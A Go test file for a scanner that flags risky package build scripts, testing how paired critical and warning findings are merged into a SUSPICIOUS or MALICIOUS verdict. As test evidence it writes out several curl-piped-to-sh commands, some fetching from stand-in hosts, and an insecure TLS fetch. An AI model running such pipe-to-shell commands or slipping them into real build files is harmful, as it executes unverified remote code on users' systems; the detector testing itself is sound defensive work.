package scan

import "testing"

// Observed on 1panel-stable-bin: the model reported one curl|sh line twice —
// pipe_to_shell (critical) and unpinned_upstream_installer (warning) — with
// identical evidence, and the critical's own note conceded "even if the host
// belongs to the upstream vendor". deriveVerdict resolved that by taking the
// maximum, which is the wrong direction: the warning is the more specific claim
// and the one the model actually argued for.
func TestHedgedPairResolvesToTheSpecificClaim(t *testing.T) {
	const ev = "curl -sfL https://resource.fit2cloud.com/installation-log.sh | sh"
	v := VerdictFromChecks([]Check{
		{ID: "pipe_to_shell", Triggered: true, File: "PKGBUILD", Evidence: ev,
			Note: "even if the host belongs to the upstream vendor, the content is unpinned"},
		{ID: "unpinned_upstream_installer", Triggered: true, File: "PKGBUILD", Evidence: ev,
			Note: "the vendor's own host, but unpinned and unchecksummed"},
		{ID: "insecure_tls_fetch", Triggered: true, File: "PKGBUILD", Evidence: "curl -LOk -o $p $u"},
		{ID: "packaging_policy_violation", Triggered: true, File: "PKGBUILD", Evidence: "source=()"},
	})
	if v.Verdict != "SUSPICIOUS" {
		t.Errorf("verdict = %q, want SUSPICIOUS: a hedge must not become MALICIOUS", v.Verdict)
	}
	for _, f := range v.Findings {
		if f.Severity == "critical" {
			t.Errorf("the hedged critical must be dropped, got %+v", f)
		}
	}
	if len(v.Findings) != 3 {
		t.Errorf("expected 3 findings after dropping the hedge, got %d", len(v.Findings))
	}
}

// A critical reported ALONE is a decision, not a hedge, and must stand.
func TestUnhedgedCriticalStands(t *testing.T) {
	v := VerdictFromChecks([]Check{
		{ID: "pipe_to_shell", Triggered: true, File: "PKGBUILD",
			Evidence: "curl -sL http://random-vps.example/i.sh | sh"},
	})
	if v.Verdict != "MALICIOUS" {
		t.Errorf("verdict = %q, want MALICIOUS", v.Verdict)
	}
}

// The pair only collapses on the SAME evidence. Two different curl|sh lines,
// one from the vendor and one from a stranger, are two findings.
func TestDifferentEvidenceIsNotAHedge(t *testing.T) {
	v := VerdictFromChecks([]Check{
		{ID: "unpinned_upstream_installer", Triggered: true, File: "PKGBUILD",
			Evidence: "curl -sfL https://vendor.example/install.sh | sh"},
		{ID: "pipe_to_shell", Triggered: true, File: "PKGBUILD",
			Evidence: "curl -sL http://random-vps.example/x.sh | sh"},
	})
	if v.Verdict != "MALICIOUS" {
		t.Errorf("verdict = %q, want MALICIOUS: a second, unrelated host is a real finding", v.Verdict)
	}
}

// Every pair must be declared in both directions of the design: a critical with
// a benign sibling in the catalog must appear in siblingOf, or the hedge goes
// unresolved.
func TestEverySiblingPairIsDeclared(t *testing.T) {
	for crit, benign := range siblingOf {
		c, ok := checkCatalog[crit]
		if !ok || c.Severity != "critical" {
			t.Errorf("%s should be a critical check", crit)
		}
		b, ok := checkCatalog[benign]
		if !ok || b.Severity != "warning" {
			t.Errorf("%s should be a warning check", benign)
		}
	}
	if !contains(Instructions, "ALTERNATIVES, not a scale") {
		t.Error("the instructions must tell the model the pairs are mutually exclusive")
	}
}
